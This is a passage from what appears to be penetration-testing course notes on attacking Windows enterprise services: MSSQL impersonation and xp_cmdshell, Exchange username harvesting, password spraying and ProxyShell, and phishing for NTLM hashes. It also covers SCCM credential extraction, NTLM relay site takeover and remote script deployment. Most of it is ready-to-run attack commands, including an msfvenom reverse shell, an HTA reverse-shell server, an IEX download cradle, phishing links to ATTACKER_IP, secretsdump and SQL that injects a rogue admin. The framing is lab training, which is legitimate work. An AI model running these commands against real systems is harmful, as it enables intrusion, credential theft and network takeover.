   exec_as_user {user}      - impersonate with execute as user
   exec_as_login {login}    - impersonate with execute as login
   xp_cmdshell {cmd}        - execute cmd via xp_cmdshell
   xp_dirtree {path}        - execute xp_dirtree on path
   sp_start_job {cmd}       - execute cmd via SQL Server Agent (blind)
   use_link {link}          - switch to linked server context
   ! {cmd}                  - execute local shell command
   show_query               - show current query
   mask_query               - mask current query
Common Usage Examples
# Enumeration
SQL (ws_dev  guest@master)> enum_impersonate
SQL (ws_dev  guest@master)> enum_db
SQL (ws_dev  guest@master)> enum_links

# Impersonate login
SQL (ws_dev  guest@master)> exec_as_login sa

# UNC path injection to capture NetNTLMv2 hash
SQL (ws_dev  guest@master)> xp_dirtree \\[target-ip]\a

# Enable and use xp_cmdshell
SQL (sa  dbo@master)> enable_xp_cmdshell
SQL (sa  dbo@master)> xp_cmdshell whoami
SQL (sa  dbo@master)> disable_xp_cmdshell

# Blind job execution
SQL (sa  dbo@master)> sp_start_job cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"

# Lateral movement to linked server
SQL (ws_dev  guest@master)> use_link SQL02
SQL >SQL02 (sa  dbo@master)> SELECT name, database_id FROM sys.databases;

# Return to local server
SQL >SQL02 (sa  dbo@master)> use_link localhost
Note: sp_start_job uses the CmdExec subsystem and sets delete_level=3, so the job auto-deletes after execution. MSSQLClient cannot decrypt linked server credentials.

14.7 Tool: PowerUpSQL

PowerUpSQL is a PowerShell toolkit by NetSPI for MSSQL enumeration and exploitation.

Connect and Query
Import-Module .\PowerUpSQL.psm1
Get-SQLQuery -Verbose -Instance "127.0.0.1,1433" -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Query "SELECT SYSTEM_USER"
Enumeration
# Discover MSSQL instances via SPNs in the domain
Get-SQLInstanceDomain -Verbose

# Get server info
Get-SQLServerInfo -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01"

# Dump full info to CSV files
mkdir SQL01; cd SQL01
Invoke-SQLDumpInfo -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01"

# Quick audit for misconfigurations
Invoke-SQLAudit -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01"
Privilege Escalation
# Auto-escalate to sysadmin (permanently assigns role)
Invoke-SQLEscalatePriv -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01" -Verbose
Command Execution
# Via xp_cmdshell
Invoke-SQLOSCmd -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01" -Command "whoami"

# Via Agent Job (blind; specify -SubSystem CmdExec, PowerShell, JScript, or VBScript)
Invoke-SQLOSCmdAgentJob -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01" -SubSystem "CmdExec" -Command "whoami"

# Via OLE Automation
Invoke-SQLOSCmdOle -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01" -Command "whoami"
Lateral Movement
# Crawl linked servers
Get-SqlServerLinkCrawl -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01"

# Execute query on all linked servers
$Out = Get-SQLServerLinkCrawl -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01" -Query "SELECT SYSTEM_USER"

# Parse output (System.Data.DataRow requires manual iteration)
foreach ($Server in $Out) {
    $CustomQuery = $Server.CustomQuery
    foreach ($Row in $CustomQuery) { Write-Host($Row.Item(0)) }
}

# Target a specific instance
Get-SQLServerLinkCrawl -Username "ws_dev" -Password "4X6cuvDLNer7nwYN5LBZ" -Instance "SQL01" -Query "SELECT SYSTEM_USER" -QueryTarget "SQL02"

14.8 Introduction to Exchange

Microsoft Exchange is the dominant on-premises email platform. Currently supported versions: 2016 and 2019. Key protocols: EWS (Exchange Web Services), OWA (Outlook Web App), MAPI over HTTP, ActiveSync.

Service/ComponentDescription
AutoDiscoverAutomatic connection using username and password only
Outlook Web App (OWA)Web-based email client (typically mail.company.org or /owa)
Global Address List (GAL)Catalog of all email addresses in Active Directory
Outlook RulesAutomated triggers based on criteria
EWSSOAP over HTTP API for application integration

Login schema: DOMAIN\username. The People view exposes user roles and contact details useful for phishing reconnaissance.

14.9 Exchange Enumeration

Key objectives: discover the email address schema, build a valid username list, identify the Exchange version, and enumerate NTLM endpoints.

14.9.1 Username Generation with username-anarchy

# Clone and generate usernames from a names list
git clone https://github.com/urbanadventurer/username-anarchy.git
./username-anarchy --input-file ./names.txt

# List available format plugins
./username-anarchy --list-formats

# Generate in a specific format
./username-anarchy --input-file ./names.txt -f first.last

14.9.2 Export Global Address List (Linux)

# Download the GAL extraction script
wget -q https://raw.githubusercontent.com/pigeonburger/global-address-list-owa/main/emailextract.py

# Modify the script to disable SSL verification (add to imports):
# import urllib3
# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Add verify=False to all get/post calls

# Run the script
python3 emailextract.py -i exch01.[domain] -u [email protected] -p '[password]'

14.9.3 Export Global Address List (Windows)

# Load MailSniper and extract GAL
IEX(New-Object Net.WebClient).DownloadString('http://[target-ip]:8000/MailSniper.ps1')
Get-GlobalAddressList -ExchHostname exch01.[domain] -Username [user] -Password 'HTB_@cademy_stdnt!' -OutFile globaladdresslist.txt

14.9.4 Version Enumeration via eDiscovery

curl https://<TARGET_IP>/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application -k | xmllint --format - | grep version

14.9.5 NTLM Endpoint Enumeration

# Discover NTLM-protected endpoints
git clone https://github.com/nyxgeek/ntlmscan
cd ntlmscan
python3 ntlmscan.py --host https://<TARGET_IP>

# Extract domain/computer info from NTLM challenge headers
sudo nmap -sV --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ -p443 <TARGET_IP>

14.9.6 Check Domain Password Policy

# Check lockout policy before spraying
(Get-DomainPolicy)."SystemAccess"

Methodology

  • Generate candidate usernames from employee names: 
    ./username-anarchy --input-file ./names.txt > usernames.txt
  • Extract GAL from Linux with known credentials: 
    python3 emailextract.py -i exch01.[domain] -u [email protected] -p 'PASSWORD'
  • Enumerate Exchange version: 
    curl https://<IP>/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application -k | xmllint --format - | grep version
  • Scan for NTLM endpoints: 
    python3 ntlmscan.py --host https://<IP>
  • Get domain lockout policy: 
    (Get-DomainPolicy)."SystemAccess"

14.10 Exchange Password Spray

Password spraying tries one password against many accounts, avoiding lockout thresholds. Common password patterns: CompanyName<YEAR>!, Season<YEAR>!.

14.10.1 Password Spray from Linux with Ruler

Ruler abuses Exchange client-side features via MAPI/HTTP or RPC/HTTP. It supports autodiscover-based user enumeration and password spraying.

# View Ruler options
./ruler-linux64 --help

# Password spray via autodiscover
./ruler-linux64 --domain [domain] --insecure brute \
  --users global_address_list.txt --passwords passwords.txt --verbose -a 4
Ruler FlagPurpose
--domainTarget domain
--insecure / -kIgnore SSL certificate errors
--basic / -bForce Basic authentication
--noencryptDisable RPC-level encryption
--rpcForce RPC/HTTP instead of MAPI/HTTP
-a <N>Thread count

14.10.2 Password Spray from Windows with MailSniper

# OWA password spray (username format: DOMAIN\Username)
Invoke-PasswordSprayOWA -ExchHostname exch01.[domain] -UserList .\usernames.txt -Password "Inlanefreight2024!" -OutFile creds.txt

# EWS password spray
Invoke-PasswordSprayEWS -ExchHostname exch01.[domain] -UserList .\usernames.txt -Password "Inlanefreight2024!" -OutFile creds.txt

Methodology

  • Password spray via Ruler (Linux): 
    ./ruler-linux64 --domain [domain] --insecure brute --users users.txt --passwords passwords.txt --verbose -a 4
  • Password spray via MailSniper (Windows): 
    Invoke-PasswordSprayOWA -ExchHostname exch01.[domain] -UserList .\usernames.txt -Password "Inlanefreight2024!" -OutFile creds.txt

14.11 Exchange Vulnerabilities

14.11.1 ProxyShell (CVE-2021-34473 / CVE-2021-34523 / CVE-2021-31207)

ProxyShell is a pre-auth RCE chain discovered by Orange Tsai. It exploits:

  • Pre-auth Path Confusion: mailbox parameter in URI lacks input validation (/autodiscover/[email protected]/mapi/nspi?&Email=autodiscover/autodiscover.json%[email protected])
  • Elevation of Privilege: abuse of Exchange PowerShell backend
  • Arbitrary File Write: New-MailboxExportRequest with -FilePath to write a webshell as PST content
# Exploit using mr-r3bot's tool
git clone https://github.com/mr-r3bot/Proxyshell-Exchange
cd Proxyshell-Exchange/
python3 proxyshell.py -u https://[target-ip]/ -e [email protected]
# After successful exploitation, interact with the shell:
# PS> get_shell
# Shell> whoami
# nt authority\system
Note: If one exploit version fails, try the Metasploit module as an alternative.

14.11.2 Other Notable Vulnerabilities

CVE / NameTypeAffected Versions
ProxyLogon (CVE-2021-26855)Pre-auth RCE via proxy/logon mechanismExchange 2013 < 15.00.1497.012, 2016 < 15.01.2106.013, 2019 < 15.02.0721.013 / 0792.010
ProxyRelayNTLM relay via ExchangeMultiple
PrivExchangePrivilege escalation via Exchange push notificationsMultiple

Methodology

  • Check Exchange version for ProxyShell: 
    curl https://<IP>/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application -k | xmllint --format - | grep version
  • Exploit ProxyShell: 
    python3 proxyshell.py -u https://<TARGET_IP>/ -e [email protected]

14.12 Exchange Phishing Attacks

14.12.1 Phishing for NTLM Hashes

Embedding a UNC path to an SMB share in an email (e.g., as an image signature) causes Windows to auto-authenticate when the email is viewed. Conditions that may prevent this: outbound port 445 blocked, Outlook not downloading images, or restrictive settings.

14.12.2 ntlm_theft - Multi-Format Hash Theft Documents

# Clone and generate a hash-stealing file
git clone -q https://github.com/Greenwolf/ntlm_theft
cd ntlm_theft

# Generate an HTM file that triggers NTLM authentication
python3 ntlm_theft.py -g htm -s [target-ip] -f student

# Start Responder to catch the hash
sudo responder -I tun0

# Send student/student.htm as an email attachment to the target

14.12.3 HTA Payload via Metasploit

# Start the HTA server with a reverse shell payload
msfconsole -x "use exploit/windows/misc/hta_server; set LHOST [target-ip]; set LPORT 8443; set SRVHOST [target-ip]; run -j"
# URL to send: http://[target-ip]:8080/oDwKp3.hta

14.12.4 HTML Smuggling

Serve a webpage that uses JavaScript to reconstruct and auto-download a malicious file, bypassing email content filters.

# Generate a payload
msfvenom -p [password]/shell/reverse_tcp LHOST=[target-ip] LPORT=9001 -f exe > shell.exe

# Base64-encode the payload
base64 -w0 shell.exe

# HTML smuggling page template:
# <html>
#   <script>
#     function base64ToArrayBuffer(base64) { ... }
#     var file = '<BASE64_PAYLOAD>';
#     var data = base64ToArrayBuffer(file);
#     var blob = new Blob([data], {type: 'octet/stream'});
#     var fileName = 'policies.doc';
#     // trigger download ...
#   </script>
# </html>

14.12.5 Credential Harvesting via Responder HTTP Server

# Start Responder HTTP server to prompt credentials
sudo responder -I tun0

# Send a phishing email with a hyperlink to http://<ATTACKER_IP>/
# When the victim clicks, Responder captures NTLMv2 credentials

14.12.6 CVE-Based Hash Theft

CVEVectorRequirement
CVE-2023-35636Calendar sharing exploit leaks NTLM hashOutlook application on victim
CVE-2023-23397Reminder sound path triggers NTLM authOutlook application on victim; automated via PowerShell (Oddvar Moe's script)

14.13 Introduction to SCCM

System Center Configuration Manager (SCCM), now called Microsoft Configuration Manager (ConfigMgr), is used by admins to centrally manage servers and workstations: software deployment, patching, OS deployment, and script execution.

14.13.1 SCCM Architecture

ComponentRole
Primary ServerCentral management point; identified by a site code
MSSQL Primary DatabaseStores all SCCM site data (on primary server or dedicated server)
SMS ProviderInterfaces between SCCM service and MSSQL; hosts WMI and AdminService REST API
Distribution Point (DP)Distributes applications and packages to client machines
Management Point (MP)Orchestrates configuration transmission from clients to primary server
Secondary Site ServerOptional; local DB; offloads primary for bandwidth-limited sites
Passive Site ServerStandby; activates if primary goes down

14.13.2 Client Deployment Methods

MethodNotes
Client Push Installation (default)Uses client push accounts with local admin rights on targets; least secure
Software Update-BasedDeploys via software update channel
Group Policy InstallationUses GPO to install client
Manual InstallationPer-machine manual install
Logon ScriptInstalls via logon scripts
Package and ProgramUses a dedicated installation package
Note: During client push, if all push accounts fail on a target, the Primary Server tries its own machine account as a last resort.

14.14 SCCM PXE Initial Access

PXE (Pre-Boot Execution Environment) allows network booting. SCCM often co-locates with a PXE server. PXE boot media may contain domain credentials (NAA, domain join accounts).

14.14.1 PXEThief - Extract Credentials from PXE Boot Media

# View PXEThief help
PS C:\Tools\PXEThief> python .\pxethief.py -h

# Option 2: Coerce PXE boot against a specific Distribution Point
PS C:\Tools\PXEThief> python .\pxethief.py 2 [target-ip]

# Download the boot.var file via TFTP (path returned by pxethief option 2)
PS C:\Tools> tftp -i [target-ip] GET "\SMSTemp\2024.05.19.13.06.09.0001.{48463D2D-ABD9-4697-8665-D75CDA255804}.boot.var" "boot.var"

# Generate hashcat hash from boot.var
PS C:\Tools\PXEThief> python .\pxethief.py 5 '.\boot.var'

14.14.2 Crack PXE Password Hash

# Install custom hashcat module for SCCM PXE (module 19850)
cd hashcat_pxe/
git clone https://github.com/hashcat/hashcat.git
git clone https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module
cp configmgr-cryptderivekey-hashcat-module/module_code/module_19850.c hashcat/src/modules/
cp configmgr-cryptderivekey-hashcat-module/opencl_code/m19850* hashcat/OpenCL/
cd hashcat
git checkout -b v6.2.5 tags/v6.2.5
make

# Crack with rockyou
hashcat/hashcat -m 19850 --force -a 0 hashcat/hash /usr/share/wordlists/rockyou.txt

14.14.3 Decrypt Boot Media and Extract Credentials

# Decrypt boot.var with cracked password to extract NAA/domain creds
PS C:\Tools\PXEThief> python .\pxethief.py 3 '.\boot.var' "[password]"
# Output includes:
# [!] Network Access Account Username: '[DOMAIN]\sccm_naa'
# [!] Network Access Account Password: 'Password!'
# [!] OSDJoinAccount - [DOMAIN]\sccm_naa / OSDJoinPassword - Password!

Methodology

  • Identify PXE Distribution Point and download boot variables: 
    python .\pxethief.py 2 <DP_IP>
tftp -i <DP_IP> GET "<path_from_output>" "boot.var"
  • Generate hashcat hash and crack: 
    python .\pxethief.py 5 '.\boot.var'
# Then on Linux:
hashcat/hashcat -m 19850 --force -a 0 hash /usr/share/wordlists/rockyou.txt
  • Decrypt boot media with cracked password: 
    python .\pxethief.py 3 '.\boot.var' "[password]"

14.15 SCCM Auditing and Enumeration

SCCM schema extensions create an AD container CN=System Management,CN=System and LDAP object classes like mssmsmanagementpoint and mssmssite.

14.15.1 Setting Up a Tunnel with ligolo-ng

# Download agent and proxy
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip
unzip ligolo-ng_agent_0.6.2_windows_amd64.zip

wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz
tar -xvf ligolo-ng_proxy_0.6.2_linux_amd64.tar.gz

# Start proxy on attack host
./proxy -selfcert

# On the target Windows machine: connect agent to proxy
.\agent.exe --ignore-cert -connect [target-ip]:11601

# On attack host: configure the tunnel session
ligolo-ng >> session
# Select: 1 - #1 - [DOMAIN]\[user]@[host]
[Agent : [DOMAIN]\[user]@[host]] >> interface_create --name internal1
[Agent : [DOMAIN]\[user]@[host]] >> tunnel_start --tun internal1

# Add route to internal network
sudo ip route add [target-ip]/24 dev internal1

# Verify connectivity
nmap -sCV [target-ip] -p445,1433

14.15.2 Installing sccmhunter

git clone -q https://github.com/garrettfoster13/sccmhunter
cd sccmhunter
python3 -m venv .sccmhunter
source .sccmhunter/bin/activate
python3 -m pip install -r requirements.txt

14.15.3 LDAP Enumeration with sccmhunter find

The find module performs three LDAP checks: (1) parses CN=System Management DACL, (2) queries for published Management Points, (3) searches for strings "SCCM" and "MECM" in the directory.

python3 sccmhunter.py find -u [user] -p [password] -d lab.local -dc-ip [target-ip]

# Show all discovered infrastructure
python3 sccmhunter.py show -all

14.15.4 SMB Profile Enumeration

The smb module profiles site system roles: validates SMB/HTTP(S)/MSSQL connectivity, checks SMB signing, identifies DP/MP/SMS Provider/WSUS roles, and downloads PXEBoot variable files if found.

python3 sccmhunter.py smb -u [user] -p [password] -d lab.local -dc-ip [target-ip] -save

Methodology

  • Set up ligolo-ng tunnel to reach internal network: 
    ./proxy -selfcert
# (on target) .\agent.exe --ignore-cert -connect <ATTACK_IP>:11601
sudo ip route add [target-ip]/24 dev internal1
  • Enumerate SCCM infrastructure via LDAP: 
    python3 sccmhunter.py find -u <USER> -p <PASS> -d <DOMAIN> -dc-ip <DC_IP>
python3 sccmhunter.py show -all
  • Profile SCCM infrastructure over SMB: 
    python3 sccmhunter.py smb -u <USER> -p <PASS> -d <DOMAIN> -dc-ip <DC_IP> -save

14.16 Abusing SCCM - Credential Harvesting

Credentials can be found in three locations on SCCM servers:

LocationDescription
Device Collection VariablesKey-value pairs in SCCM collections; may contain credentials
Task Sequence VariablesVariables in deployment task sequences; may include domain join credentials
Network Access Accounts (NAAs)Domain accounts for DP access by unenrolled machines; stored encrypted (DPAPI) on disk

14.16.1 DPAPI Secrets Extraction (sccmhunter)

# Extract via WMI (requires admin on SCCM server)
python3 sccmhunter.py dpapi -u rai -p [password] -d lab.local -dc-ip [target-ip] -target [target-ip] -wmi

# Extract from disk (OBJECTS.DATA)
python3 sccmhunter.py dpapi -u rai -p [password] -d lab.local -dc-ip [target-ip] -target [target-ip] -disk

# Extract both
python3 sccmhunter.py dpapi -u rai -p [password] -d lab.local -dc-ip [target-ip] -target [target-ip] -both

14.16.2 NAA Extraction via Fake Machine Enrollment (HTTP Module)

# Create a new computer account (if MachineAccountQuota allows)
addcomputer.py -computer-name 'PWNED$' -computer-pass 'ComputerPass123' -dc-ip [target-ip] 'LAB.LOCAL/Blwasp':'[password]'

# Request SCCM policy as the new machine account to extract NAA credentials
python3 sccmhunter.py http -u [user] -p '[password]' -dc-ip [target-ip] -cn 'PWNED$' -cp 'ComputerPass123' -debug

# Alternative: auto mode
python3 sccmhunter.py http -u [user] -p '[password]' -dc-ip [target-ip] --auto

14.16.3 Client Push Exploitation (NTLM Coercion)

Forged DDR requests make the Primary Server attempt SCCM client push, triggering sequential authentication by all push accounts. Requires: KB15599094 not patched, NTLM not disabled, no HTTPS, no PKI for client push.

# Terminal 1: start Inveigh to capture NTLMv2 hashes
PS C:\Tools> .\Inveigh.exe

# Terminal 2: trigger client push via SharpSCCM DDR enrollment
PS C:\Tools> .\SharpSCCM.exe invoke client-push -t [target-ip]

Methodology

  • Extract SCCM secrets via DPAPI (WMI): 
    python3 sccmhunter.py dpapi -u <ADMIN_USER> -p <PASS> -d <DOMAIN> -dc-ip <DC_IP> -target <SCCM_IP> -wmi
  • Create machine account and request NAA policy: 
    addcomputer.py -computer-name 'PWNED$' -computer-pass 'ComputerPass123' -dc-ip <DC_IP> '<DOMAIN>/<USER>':'<PASS>'
python3 sccmhunter.py http -u <USER> -p <PASS> -dc-ip <DC_IP> -cn 'PWNED$' -cp 'ComputerPass123' -debug
  • Trigger client push to capture push account hashes: 
    .\Inveigh.exe
# (separate terminal)
.\SharpSCCM.exe invoke client-push -t <YOUR_IP>

14.17 SCCM Site Takeover I - NTLM Relay to MSSQL

When the MSSQL site database is on a separate server, the Primary Server machine account is a local admin on the DB server. Relaying SCCM01$ authentication to the MSSQL service grants DB access, allowing injection of a new SCCM Full Administrator into RBAC_Admins.

14.17.1 NTLM Relay Setup

# Install latest impacket (requires v0.11+)
git clone -q https://github.com/fortra/impacket
cd impacket
python3 -m venv .impacket
source .impacket/bin/activate
python3 -m pip install .

# Start ntlmrelayx targeting MSSQL with SOCKS
python3 examples/ntlmrelayx.py -t "mssql://[target-ip]" -smb2support -socks

14.17.2 Coerce Authentication via PetitPotam

python3 PetitPotam.py -u [user] -p '[password]' -d 'lab.local' [target-ip] [target-ip]

14.17.3 Connect to MSSQL via SOCKS and Add SCCM Admin

# Connect through the ntlmrelayx SOCKS session
proxychains4 -q python3 examples/mssqlclient.py 'LAB/SCCM01$'@[target-ip] -windows-auth -no-pass

-- Switch to the SCCM database
SQL ([DOMAIN]\SCCM01$  dbo@master)> use CM_HTB

-- Review existing admins
SQL ([DOMAIN]\SCCM01$  dbo@CM_HTB)> SELECT * FROM RBAC_Admins

# Get SID of the target user (on a domain-joined machine)
Import-Module .\PowerView.ps1
Get-DomainUser [user] -Properties objectsid

# Convert SID to binary format
function Convert-StringSidToBinary {
    param ([Parameter(Mandatory=$true, Position=0)][string]$StringSid)
    $sid = New-Object System.Security.Principal.SecurityIdentifier $StringSid
    $binarySid = New-Object byte[] ($sid.BinaryLength)
    $sid.GetBinaryForm($binarySid, 0)
    $binarySidHex = ($binarySid | ForEach-Object { $_.ToString("X2") }) -join ''
    echo "0x$($binarySidHex.ToLower())"
}
Convert-StringSidToBinary S-1-5-21-2570265163-3918697770-3667495639-1111

-- Insert new administrator into RBAC_Admins
INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite)
VALUES ([sid-hex],'[DOMAIN]\[user]',0,0,'','','','','HTB');

-- Add Full Administrator roles to RBAC_ExtendedPermissions (AdminID must match new row)
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777223,'SMS0001R','SMS00ALL','29');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777223,'SMS0001R','SMS00001','1');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777223,'SMS0001R','SMS00004','1');

# Verify new admin via sccmhunter (target SMS Provider IP)
python3 sccmhunter.py admin -u [user] -p '[password]' -ip [target-ip]
() (C:\) >> show_admins

Methodology

  • Start ntlmrelayx targeting MSSQL with SOCKS: 
    python3 examples/ntlmrelayx.py -t "mssql://<SQL_IP>" -smb2support -socks
  • Coerce SCCM01 authentication: 
    python3 PetitPotam.py -u <USER> -p '<PASS>' -d '<DOMAIN>' <ATTACKER_IP> <SCCM01_IP>
  • Connect to MSSQL via proxychains and inject SCCM admin: 
    proxychains4 -q python3 examples/mssqlclient.py 'LAB/SCCM01$'@<SQL_IP> -windows-auth -no-pass
    use CM_HTB;
INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite)
VALUES (<BINARY_SID>,'[DOMAIN]\<USER>',0,0,'','','','','HTB');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00ALL','29');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00001','1');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (<AdminID>,'SMS0001R','SMS00004','1');

14.18 SCCM Site Takeover II - NTLM Relay to SMS Provider & Passive Server

14.18.1 Relay to SMS Provider AdminService API

The Primary Server machine account is in the SMS Admins group, which has WMI/AdminService API access. The AdminService REST API rarely enforces NTLM signing, so relaying to it allows adding a new Full Administrator via the SMS_Admin WMI class.

# Clone the relay-sccm fork of impacket
git clone -b feature/relay-sccm-adminservice --single-branch https://github.com/garrettfoster13/impacket.git relay-sccm
cd relay-sccm
python3 -m venv .sccmrelay
source .sccmrelay/bin/activate
python3 -m pip install .

cd examples
sudo su
source .sccmrelay/bin/activate

# Relay authentication to AdminService API
python3 ntlmrelayx.py \
  -t https://[target-ip]/AdminService/wmi/SMS_Admin \
  -smb2support --adminservice \
  --logonname "[DOMAIN]\dario" --displayname "[DOMAIN]\dario" \
  --objectsid S-1-5-21-2570265163-3918697770-3667495639-2222

# In another terminal: coerce SCCM01 authentication
python3 PetitPotam.py -u [user] -p '[password]' -d 'lab.local' [target-ip] [target-ip]

# Verify new admin
python3 sccmhunter.py admin -u [user] -p [password] -ip [target-ip]
() C:\ >> show_admins

14.18.2 Relay from Passive Site Server

The passive site server machine account is a local admin on all SCCM systems. Relaying its authentication to the primary server's SMB yields a SOCKS session with admin rights.

# Start ntlmrelayx targeting primary server SMB with SOCKS
ntlmrelayx.py -t [target-ip] -smb2support -socks

# Coerce authentication from passive server (SCCM02)
python3 PetitPotam.py -u [user] -p '[password]' -d 'lab.local' [target-ip] [target-ip]

# Dump credentials from primary server via proxychains
proxychains4 -q secretsdump.py 'LAB/SCCM02$'@[target-ip] -no-pass

# Use SCCM01$ hash to authenticate as SMS Provider admin
python3 sccmhunter.py admin -u 'SCCM01$' \
  -p aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> \
  -ip [target-ip]

Methodology

  • Relay to SMS Provider AdminService API to add Full Admin: 
    python3 ntlmrelayx.py -t https://<SMS_IP>/AdminService/wmi/SMS_Admin -smb2support --adminservice --logonname "[DOMAIN]\<USER>" --displayname "[DOMAIN]\<USER>" --objectsid <USER_SID>
python3 PetitPotam.py -u <USER> -p '<PASS>' -d '<DOMAIN>' <ATTACKER_IP> <SCCM01_IP>
  • Relay from passive server to primary; dump credentials: 
    ntlmrelayx.py -t <SCCM01_IP> -smb2support -socks
python3 PetitPotam.py -u <USER> -p '<PASS>' -d '<DOMAIN>' <ATTACKER_IP> <SCCM02_IP>
proxychains4 -q secretsdump.py 'LAB/SCCM02$'@<SCCM01_IP> -no-pass

14.19 SCCM Post-Exploitation

With SCCM Full Administrator rights, you can enumerate all managed resources via CMPivot (the AdminService REST API on the SMS Provider) and deploy applications or scripts.

14.19.1 Privileged Account Enumeration

python3 sccmhunter.py admin -u rai -p [password] -ip [target-ip]
() C:\ >> show_admins

14.19.2 Device Enumeration

# Get device info and ResourceId via sccmhunter
python3 sccmhunter.py admin -u rai -p [password] -ip [target-ip]
() (C:\) >> get_device SCCM-SMS

# Interact with a device (use ResourceId from above)
() (C:\) >> interact 16777221
(16777221) (C:\) >> administrators
(16777221) (C:\) >> ls

# Get device info via SharpSCCM
.\SharpSCCM.exe get devices -n SCCM-SMS -sms [target-ip]

# Get all active SCCM clients
.\SharpSCCM.exe get devices -w "Active=1 and Client=1" -sms [target-ip]

# Get machines where a specific user is primary user
.\SharpSCCM.exe get primary-users -u [user] -sms [target-ip]

# Validate SCCM admin rights
.\SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p CollectionNames -p LogonName -p RoleNames -sms [target-ip]

14.19.3 Application Deployment (NTLM Coercion)

Deploying an application with a UNC path payload intercepts NTLM auth from the target machine account, enabling relay attacks.

# Create application with UNC path payload (triggers NTLM coercion)
.\SharpSCCM.exe new application -s -n HTB_application -p \\[target-ip]\share\test.exe -sms [target-ip]

# Create a device collection
.\SharpSCCM.exe new collection -n "new_collection" -t device -sms [target-ip]

# Add target to the collection
.\SharpSCCM.exe new collection-member -d [host] -n "new_collection" -t device -sms [target-ip]

# Create deployment
.\SharpSCCM.exe new deployment -a HTB_application -c "new_collection" -sms [target-ip]

# Force policy refresh on collection members (optional, may have timing issues)
.\SharpSCCM.exe invoke update -n "new_collection" -sms [target-ip]

# Catch the NTLM hash on attack host
sudo responder -I tun0 -v -A

14.19.4 Script Deployment

SCCM requires a second admin to approve scripts before execution. Promote a machine account to Full Admin to act as the approver.

# Create the script payload
cat cmd.txt
whoami;hostname

# Connect to sccmhunter admin shell and get device ResourceId
python3 sccmhunter.py admin -u [user] -p '[password]' -ip [target-ip]
() (C:\) >> get_device sccm01

# Promote machine account (PWNED$) to Full Admin for approval
() (C:\) >> add_admin PWNED$ S-1-5-21-2570265163-3918697770-3667495639-1218

# Re-connect with PWNED$ as approval account and execute script
python3 sccmhunter.py admin -u [user] -p '[password]' -ip [target-ip] -au 'PWNED$' -ap ComputerPass123
() C:\ >> interact 16777220
(16777220) (C:\) >> script /home/user/cmd.txt
# Output: nt authority\system

Methodology

  • Enumerate SCCM admins and devices: 
    python3 sccmhunter.py admin -u <USER> -p <PASS> -ip <SMS_IP>
() C:\ >> show_admins
() C:\ >> get_device <TARGET>
  • Deploy application with UNC path to coerce NTLM auth: 
    .\SharpSCCM.exe new application -s -n HTB_app -p \\<ATTACKER_IP>\share\test.exe -sms <SMS_IP>
.\SharpSCCM.exe new collection -n "col" -t device -sms <SMS_IP>
.\SharpSCCM.exe new collection-member -d <TARGET> -n "col" -t device -sms <SMS_IP>
.\SharpSCCM.exe new deployment -a HTB_app -c "col" -sms <SMS_IP>
  • Deploy a PowerShell script on a target with dual-admin approval: 
    # Promote machine account as approver
() C:\ >> add_admin PWNED$ <PWNED_SID>

# Execute script using alternate approval credentials
python3 sccmhunter.py admin -u <USER> -p <PASS> -ip <SMS_IP> -au 'PWNED$' -ap ComputerPass123
() C:\ >> interact <RESOURCE_ID>
(<RESOURCE_ID>) C:\ >> script /path/to/cmd.txt
